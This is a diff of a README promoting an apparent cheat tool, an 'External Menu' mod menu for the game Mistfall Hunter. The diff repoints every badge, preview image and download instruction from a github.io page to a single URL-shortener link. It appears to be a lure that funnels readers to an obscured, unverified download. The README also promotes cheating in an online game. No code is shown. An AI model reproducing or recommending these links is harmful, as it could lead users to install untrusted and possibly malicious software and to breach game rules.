@@ -10,28 +10,28 @@ All repository visuals are built from official Mistfall Hunter Steam artwork so 
 
 ## Quick Access
 
-[![Mistfall Hunter](https://img.shields.io/badge/Mistfall%20Hunter-External%20Menu-a98b52?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Gyldhunter](https://img.shields.io/badge/Gyldhunter-Info-6e9d85?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Relics](https://img.shields.io/badge/Relics-Loot%20View-a37544?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Map](https://img.shields.io/badge/Map-Tools-497e77?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Profiles](https://img.shields.io/badge/Config-Profiles-665946?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-806431?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Mistfall Hunter](https://img.shields.io/badge/Mistfall%20Hunter-External%20Menu-a98b52?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Gyldhunter](https://img.shields.io/badge/Gyldhunter-Info-6e9d85?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Relics](https://img.shields.io/badge/Relics-Loot%20View-a37544?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Map](https://img.shields.io/badge/Map-Tools-497e77?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Profiles](https://img.shields.io/badge/Config-Profiles-665946?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-806431?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Mistfall Hunter External Menu](https://idleobstacle.github.io/)**
+➡️ **[Download Mistfall Hunter External Menu](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Mistfall Hunter External Menu](assets/mistfall-hunter-external-menu-preview.png)](https://idleobstacle.github.io/)
+[![Mistfall Hunter External Menu](assets/mistfall-hunter-external-menu-preview.png)](https://flyn.co/17yeN7/)
 
 ### Interface
 
-[![Mistfall Hunter Mod Menu Interface](assets/mistfall-hunter-mod-menu-interface.png)](https://idleobstacle.github.io/)
+[![Mistfall Hunter Mod Menu Interface](assets/mistfall-hunter-mod-menu-interface.png)](https://flyn.co/17yeN7/)
 
 ### Real Game Reference
 
@@ -171,7 +171,7 @@ Profiles can be named around your preferred class/loadout without changing the c
 
 1. Download the current package:
 
-   **[Download Mistfall Hunter External Menu](https://idleobstacle.github.io/)**
+   **[Download Mistfall Hunter External Menu](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Read the README for the current variant.
